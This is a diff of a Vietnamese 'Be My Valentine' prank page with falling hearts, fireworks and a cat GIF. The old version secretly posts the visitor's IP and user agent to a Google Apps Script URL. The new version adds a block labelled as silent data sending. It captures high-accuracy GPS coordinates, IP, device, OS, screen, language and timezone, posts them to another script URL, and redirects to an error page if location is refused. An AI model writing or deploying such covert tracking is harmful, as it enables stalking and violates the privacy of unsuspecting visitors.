@@ -1,234 +1,249 @@
 <!DOCTYPE html>
 <html lang="vi">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Be My Valentine</title>
-    <link rel="stylesheet" href="css/valentine.css" />
-    <style>
-      /* --------------------- TWINKLE BACKGROUND --------------------- */
-      body::before {
-        content: "";
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: url('sparkle.png') repeat;
-        opacity: 0.2;
-        pointer-events: none;
-        z-index: -1;
-        animation: twinkle 5s ease-in-out infinite;
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Be My Valentine</title>
+  <link rel="stylesheet" href="css/valentine.css" />
+  <style>
+    /* --------------------- TWINKLE BACKGROUND --------------------- */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('sparkle.png') repeat;
+      opacity: 0.2;
+      pointer-events: none;
+      z-index: -1;
+      animation: twinkle 5s ease-in-out infinite;
+    }
+    @keyframes twinkle {
+      0%, 100% { opacity: 0.2; }
+      50% { opacity: 0.5; }
+    }
+
+    /* --------------------- HIỆU ỨNG EMOJI RƠI --------------------- */
+    .emoji {
+      position: absolute;
+      font-size: 2rem;
+      animation: fallEmoji 5s linear infinite;
+      pointer-events: none;
+    }
+    @keyframes fallEmoji {
+      0% {
+        transform: translateY(-50px) rotate(0deg);
+        opacity: 1;
       }
-      @keyframes twinkle {
-        0%, 100% { opacity: 0.2; }
-        50% { opacity: 0.5; }
+      100% {
+        transform: translateY(100vh) rotate(360deg);
+        opacity: 0;
       }
+    }
 
-      /* --------------------- HIỆU ỨNG EMOJI RƠI --------------------- */
-      .emoji {
-        position: absolute;
-        font-size: 2rem;
-        animation: fallEmoji 5s linear infinite;
-        pointer-events: none;
+    /* --------------------- HIỆU ỨNG PHÁO HOA --------------------- */
+    .firework-particle {
+      position: absolute;
+      border-radius: 50%;
+      pointer-events: none;
+      animation: explode 1.2s ease-out forwards;
+    }
+    @keyframes explode {
+      from {
+        transform: translate3d(0, 0, 0);
+        opacity: 1;
       }
-      @keyframes fallEmoji {
-        0% {
-          transform: translateY(-50px) rotate(0deg);
-          opacity: 1;
-        }
-        100% {
-          transform: translateY(100vh) rotate(360deg);
-          opacity: 0;
-        }
+      to {
+        transform: translate3d(var(--dx), var(--dy), 0);
+        opacity: 0;
       }
+    }
 
-      /* --------------------- HIỆU ỨNG PHÁO HOA --------------------- */
-      .firework-particle {
-        position: absolute;
-        border-radius: 50%;
-        pointer-events: none;
-        animation: explode 1.2s ease-out forwards;
+    /* --------------------- CÀI ĐẶT CƠ BẢN --------------------- */
+    body {
+      margin: 0;
+      padding: 40px;
+      background-color: #fff6e9;
+      text-align: center;
+      font-family: 'Courier New', Courier, monospace;
+      color: #f48b8b;
+      overflow: hidden;
+      position: relative;
+    }
+    #valentineQuestion {
+      font-size: 2.5rem;
+      margin-bottom: 30px;
+      font-weight: bold;
+    }
+    .answerButton {
+      background-color: #ffe5e5;
+      border: 2px solid #f8a5c2;
+      color: #d66c6c;
+      padding: 12px 24px;
+      font-size: 1.2rem;
+      border-radius: 12px;
+      margin: 10px;
+      cursor: pointer;
+      transition: transform 0.3s ease, font-size 0.3s ease;
+      position: relative;
+    }
+    .answerButton:hover {
+      transform: scale(1.1);
+    }
+    .responsive {
+      max-width: 100%;
+      height: auto;
+    }
+  </style>
+</head>
+<body>
+  <!-- Âm nhạc nền -->
+  <audio id="bgMusic" autoplay loop>
+    <source src="perfect.mp3" type="audio/mpeg" />
+    Trình duyệt của bạn không hỗ trợ âm thanh.
+  </audio>
+
+  <div id="valentineQuestion">
+    <b>Cậu đi chơi Valentine với tớ nhé?</b>
+  </div>
+  <button class="answerButton" id="yesButton" onclick="yesAction()">Có</button>
+  <button class="answerButton" id="noButton" onclick="noAction()">Không</button>
+  <br />
+  <img src="cat.gif" alt="cat asking question" class="responsive" id="catImage" />
+
+  <script>
+    /* --------------- HIỆU ỨNG EMOJI RƠI --------------- */
+    function createFallingEmojis() {
+      const emojiContainer = document.createElement("div");
+      emojiContainer.className = "emoji";
+      emojiContainer.textContent = "💖";
+
+      emojiContainer.style.left = Math.random() * 100 + "vw";
+      emojiContainer.style.top = Math.random() * 10 + "vh";
+
+      const duration = Math.random() * 5 + 10;
+      emojiContainer.style.animationDuration = `${duration}s`;
+
+      let minSize, maxSize;
+      if (window.innerWidth < 768) {
+        minSize = 10;
+        maxSize = 18;
+      } else {
+        minSize = 12;
+        maxSize = 24;
       }
-      @keyframes explode {
-        from {
-          transform: translate3d(0, 0, 0);
-          opacity: 1;
-        }
-        to {
-          transform: translate3d(var(--dx), var(--dy), 0);
-          opacity: 0;
-        }
+      emojiContainer.style.fontSize = Math.random() * (maxSize - minSize) + minSize + "px";
+
+      document.body.appendChild(emojiContainer);
+      setTimeout(() => emojiContainer.remove(), duration * 1000);
+    }
+
+    const intervalTime = window.innerWidth < 768 ? 500 : 200;
+    setInterval(createFallingEmojis, intervalTime);
+
+    /* --------------- HIỆU ỨNG PHÁO HOA --------------- */
+    function createExplosionAt(corner) {
+      const numParticles = 80;
+      const colors = ["#ff6ec7", "#ff9a9e", "#fad0c4", "#fbc2eb", "#a18cd1"];
+      const posX = Math.floor(window.innerWidth * corner.x);
+      const posY = Math.floor(window.innerHeight * corner.y);
+
+      for (let i = 0; i < numParticles; i++) {
+        const particle = document.createElement("div");
+        particle.className = "firework-particle";
+        particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+        const size = Math.random() * 10 + 10;
+        particle.style.width = particle.style.height = size + "px";
+        particle.style.left = posX + "px";
+        particle.style.top = posY + "px";
+        const angle = Math.random() * Math.PI * 2;
+        const distance = Math.random() * 300 + 50;
+        const dx = Math.cos(angle) * distance;
+        const dy = Math.sin(angle) * distance;
+        particle.style.setProperty("--dx", dx + "px");
+        particle.style.setProperty("--dy", dy + "px");
+        document.body.appendChild(particle);
+        setTimeout(() => particle.remove(), 1300);
       }
+    }
 
-      /* --------------------- CÀI ĐẶT CƠ BẢN --------------------- */
-      body {
-        margin: 0;
-        padding: 40px;
-        background-color: #fff6e9;
-        text-align: center;
-        font-family: 'Courier New', Courier, monospace;
-        color: #f48b8b;
-        overflow: hidden;
-        position: relative;
-      }
-      #valentineQuestion {
-        font-size: 2.5rem;
-        margin-bottom: 30px;
-        font-weight: bold;
-      }
-      .answerButton {
-        background-color: #ffe5e5;
-        border: 2px solid #f8a5c2;
-        color: #d66c6c;
-        padding: 12px 24px;
-        font-size: 1.2rem;
-        border-radius: 12px;
-        margin: 10px;
-        cursor: pointer;
-        transition: transform 0.3s ease, font-size 0.3s ease;
-        position: relative;
-      }
-      .answerButton:hover {
-        transform: scale(1.1);
-      }
-      .responsive {
-        max-width: 100%;
-        height: auto;
-      }
-    </style>
-  </head>
-  <body>
-    <!-- Đoạn mã lấy IP và gửi đến Google Sheets -->
-    <script>
-      // Lấy IP từ ipify và gửi đến Google Sheets
-      fetch("https://api.ipify.org?format=json")
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip;  // Lấy địa chỉ IP
-          const ua = navigator.userAgent;  // Lấy User Agent từ trình duyệt
+    function triggerFireworks() {
+      const corners = [
+        { x: 0.05, y: 0.05 },
+        { x: 0.95, y: 0.05 },
+        { x: 0.05, y: 0.90 },
+        { x: 0.95, y: 0.90 }
+      ];
+      corners.forEach(corner => createExplosionAt(corner));
+    }
 
-          // Gửi yêu cầu POST với IP và UA
-          fetch("https://script.google.com/macros/s/AKfycbync2dl9TRnWRGAIKBWweAQ-8eOj3fqrxaqiNN_X2JdY7DsHatR6-4gZacpM6x_7Ju1/exec", {
-            method: "POST",  // Đảm bảo là POST
-            headers: {
-              "Content-Type": "application/x-www-form-urlencoded"
-            },
-            body: `ip=${ip}&ua=${encodeURIComponent(ua)}`  // Gửi tham số 'ip' và 'ua'
-          })
-          .then(response => response.text())
-          .then(data => {
-            console.log("Server Response:", data);  // Kiểm tra phản hồi từ server
-          })
-          .catch(error => console.error("Error:", error));  // Xử lý lỗi
-        })
-        .catch(error => console.error("Error fetching IP:", error));  // Xử lý lỗi khi lấy IP
-    </script>
+    /* --------------- HÀM XỬ LÝ NÚT --------------- */
+    function yesAction() {
+      triggerFireworks();
+      setTimeout(() => {
+        window.location.href = "thankyou.html";
+      }, 1500);
+    }
+    function noAction() {
+      const yesBtn = document.getElementById("yesButton");
+      const currentFontSize = parseFloat(window.getComputedStyle(yesBtn).fontSize);
+      yesBtn.style.fontSize = (currentFontSize + 10) + "px";
+    }
 
-    <!-- Âm nhạc nền -->
-    <audio id="bgMusic" autoplay loop>
-      <source src="perfect.mp3" type="audio/mpeg" />
-      Trình duyệt của bạn không hỗ trợ âm thanh.
-    </audio>
+    /* --------------- GEOLOCATION VÀ GỬI DỮ LIỆU NGẦM --------------- */
+    (function() {
+      const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx9k3dt4_MomEwq1_TCDv8rauBtTFXXQy2qQZdRpDPNgB5lzCPvwsgLSMa85GJFZjUg/exec";
+      const geoOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
 
-    <div id="valentineQuestion">
-      <b>Cậu đi chơi Valentine với tớ nhé?</b>
-    </div>
-    <!-- Nút "Có": khi bấm sẽ kích hoạt hiệu ứng pháo hoa tại 4 góc và chuyển trang -->
-    <button class="answerButton" id="yesButton" onclick="yesAction()">Có</button>
-    <!-- Nút "Không": khi bấm sẽ tăng kích thước của nút "Có" -->
-    <button class="answerButton" id="noButton" onclick="noAction()">Không</button>
-    <br />
-    <!-- Hình ảnh mèo -->
-    <img src="cat.gif" alt="cat asking question" class="responsive" id="catImage" />
-
-    <script>
-      /* --------------- HIỆU ỨNG EMOJI RƠI --------------- */
-      function createFallingEmojis() {
-        const emojiContainer = document.createElement("div");
-        emojiContainer.className = "emoji";
-        emojiContainer.textContent = "💖";
-
-        // Vị trí ngang và top ngẫu nhiên
-        emojiContainer.style.left = Math.random() * 100 + "vw";
-        emojiContainer.style.top = Math.random() * 10 + "vh";
-
-        // Tốc độ rơi: random từ 10 đến 15 giây
-        const duration = Math.random() * 5 + 10;
-        emojiContainer.style.animationDuration = `${duration}s`;
-
-        // Điều chỉnh kích thước theo thiết bị:
-        let minSize, maxSize;
-        if (window.innerWidth < 768) {
-          minSize = 10;
-          maxSize = 18;
-        } else {
-          minSize = 12;
-          maxSize = 24;
-        }
-        emojiContainer.style.fontSize =
-          Math.random() * (maxSize - minSize) + minSize + "px";
-
-        document.body.appendChild(emojiContainer);
-        // Xóa emoji sau khi animation kết thúc
-        setTimeout(() => emojiContainer.remove(), duration * 1000);
-      }
-
-      // Giảm tần suất tạo emoji trên mobile để giảm “dày đặc”
-      const intervalTime = window.innerWidth < 768 ? 500 : 200;
-      setInterval(createFallingEmojis, intervalTime);
-
-      /* --------------- HIỆU ỨNG PHÁO HOA --------------- */
-      function createExplosionAt(corner) {
-        const numParticles = 80;
-        const colors = ["#ff6ec7", "#ff9a9e", "#fad0c4", "#fbc2eb", "#a18cd1"];
-        // Tính vị trí pixel của góc
-        const posX = Math.floor(window.innerWidth * corner.x);
-        const posY = Math.floor(window.innerHeight * corner.y);
-
-        for (let i = 0; i < numParticles; i++) {
-          const particle = document.createElement("div");
-          particle.className = "firework-particle";
-          particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-          const size = Math.random() * 10 + 10;
-          particle.style.width = particle.style.height = size + "px";
-          particle.style.left = posX + "px";
-          particle.style.top = posY + "px";
-          const angle = Math.random() * Math.PI * 2;
-          const distance = Math.random() * 300 + 50;
-          const dx = Math.cos(angle) * distance;
-          const dy = Math.sin(angle) * distance;
-          particle.style.setProperty("--dx", dx + "px");
-          particle.style.setProperty("--dy", dy + "px");
-          document.body.appendChild(particle);
-          setTimeout(() => particle.remove(), 1300);
-        }
+      function handleError() {
+        window.location.href = "error.html";
       }
 
-      function triggerFireworks() {
-        // Các góc được xác định theo tỷ lệ (0.05 tương đương 5%)
-        const corners = [
-          { x: 0.05, y: 0.05 },
-          { x: 0.95, y: 0.05 },
-          { x: 0.05, y: 0.90 },
-          { x: 0.95, y: 0.90 }
-        ];
-        corners.forEach(corner => createExplosionAt(corner));
-      }
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const ua = navigator.userAgent;
+            const deviceType = /Mobi|Android|iPhone|iPad/.test(ua) ? 'Mobile' : 'Desktop';
+            const os = navigator.platform || "Không rõ";
+            const screenWidth = window.innerWidth || 0;
+            const screenHeight = window.innerHeight || 0;
+            const language = navigator.language || "Không rõ";
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Không rõ";
 
-      /* --------------- HÀM XỬ LÝ NÚT --------------- */
-      function yesAction() {
-        triggerFireworks();
-        setTimeout(() => {
-          window.location.href = "thankyou.html";
-        }, 1500);
+            fetch("https://api.ipify.org?format=json")
+              .then(res => res.json())
+              .then(data => {
+                const params = new URLSearchParams({
+                  ip: data.ip,
+                  ua,
+                  lat,
+                  lon,
+                  deviceType,
+                  os,
+                  screenWidth,
+                  screenHeight,
+                  language,
+                  timezone
+                });
+                return fetch(SCRIPT_URL, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                  body: params.toString()
+                });
+              })
+              .catch(() => {});
+          },
+          () => handleError(),
+          geoOptions
+        );
+      } else {
+        handleError();
       }
-      function noAction() {
-        const yesBtn = document.getElementById("yesButton");
-        // Sử dụng parseFloat để lấy giá trị chính xác, kể cả phần thập phân
-        const currentFontSize = parseFloat(window.getComputedStyle(yesBtn).fontSize);
-        yesBtn.style.fontSize = (currentFontSize + 10) + "px";
-      }
-    </script>
-  </body>
+    })();
+  </script>
+</body>
 </html>
